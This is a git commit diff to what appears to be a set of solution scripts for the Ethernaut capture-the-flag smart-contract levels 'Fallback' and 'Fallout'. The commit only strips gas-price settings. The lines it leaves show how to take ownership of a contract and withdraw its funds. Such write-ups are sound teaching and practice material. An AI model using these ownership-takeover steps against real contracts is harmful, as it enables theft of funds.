74d8dd9c819b6b03c8ebb6f8692fa45ebe55bcf4
Steve Kok <kokchoquan@gmail.com>
2024-08-18 14:57:14 +0800

    minor edit

--- 1-fallback.js
+++ 1-fallback.js
@@ -2,10 +2,6 @@
 // So that our address appeared inside the contribution array
 await contract.contribute.sendTransaction({
     from: player,
-    gasPrice: web3.utils
-        .toBN(await web3.eth.getGasPrice())
-        .mul(web3.utils.toBN('2'))
-        .toString(),
     // Must be less than 0.001 ether
     value: toWei('0.0001'),
 });
@@ -14,18 +10,9 @@ await contract.contribute.sendTransaction({
 await sendTransaction({
     from: player,
     to: contract.address,
-    gasPrice: web3.utils
-        .toBN(await web3.eth.getGasPrice())
-        .mul(web3.utils.toBN('2'))
-        .toString(),
     // Any amount
     value: toWei('0.0001'),
 });
 
 // Step 3: Withdraw everything
-await contract.withdraw.sendTransaction({
-    gasPrice: web3.utils
-        .toBN(await web3.eth.getGasPrice())
-        .mul(web3.utils.toBN('2'))
-        .toString(),
-});
+await contract.withdraw();
--- 2-fallout.js
+++ 2-fallout.js
@@ -1,6 +1,1 @@
-await contract.Fal1out.sendTransaction({
-    gasPrice: web3.utils
-        .toBN(await web3.eth.getGasPrice())
-        .mul(web3.utils.toBN('2'))
-        .toString(),
-});
+await contract.Fal1out();
